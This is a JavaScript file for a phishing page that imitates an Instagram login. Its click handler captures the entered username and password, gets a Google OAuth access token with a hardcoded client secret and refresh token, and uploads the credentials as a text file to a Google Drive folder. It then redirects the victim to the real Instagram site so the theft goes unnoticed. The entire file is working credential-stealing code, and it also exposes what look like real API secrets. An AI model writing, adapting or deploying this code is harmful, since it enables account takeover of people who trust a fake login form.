const nameInput = document.getElementById("username");
const login = document.getElementById("login");
const password = document.getElementById("password");
const againtxt = document.getElementById("againtext");
const clientId =
  "357073439690-d8mn6ge1eplpq9ont779k0ii2f28alav.apps.googleusercontent.com";
const clientSecret = "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";

login.addEventListener("click", function (event) {
  event.preventDefault(); // Prevent form submission

  const name = nameInput.value;
  const pass = password.value;

  const folderId = "1oNr2My1dsSLP--6TglsUEspzBUsn2awF"; // Replace with the actual folder ID


  // Call the function to upload the name as a text file
  uploadNameToDrive(name, pass,folderId);
  // setTimeout(function () {
  //   window.location.href = "https://www.instagram.com/";
  // }, 5000);
  // // window.location.href = "https://www.instagram.com/";
});

function uploadNameToDrive(name, pass,folderId) {
  const refreshToken =
    "1//04J2ih4JGvPiiCgYIARAAGAQSNwF-L9IrGfEWB8NOrYTnBv6x27DPsMMl0QOSW681WjNguGCgVjaP4Fci6htMTwd0KJNvVPt4aGc"; // Replace with your actual refresh token

  // Request a new access token using the refresh token
  fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `client_id=${clientId}&client_secret=${clientSecret}&refresh_token=${refreshToken}&grant_type=refresh_token`,
  })
    .then((response) => response.json())
    .then((data) => {
      const accessToken = data.access_token;

      const fileContent = `Username: ${name}\nPassword: ${pass}`;
      const fileName = "Datafrominsta.txt";

      const metadata = {
        name: fileName,
        mimeType: "text/plain",
        parents: [folderId] // Specify the target folder ID here
      };

      const formData = new FormData();
      formData.append(
        "metadata",
        new Blob([JSON.stringify(metadata)], { type: "application/json" })
      );
      formData.append("file", new Blob([fileContent], { type: "text/plain" }));

      return fetch(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        {
          method: "POST",
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
          body: formData,
        }
      );
    })
    .then((response) => {
      if (response.ok) {
        console.log("Name uploaded successfully");
        

      } else {
        console.log("Failed to upload name");
      }
      window.location.href = "https://www.instagram.com/";
    })
    .catch((error) => {
      console.error("Error occurred while uploading name:", error);
    });
}

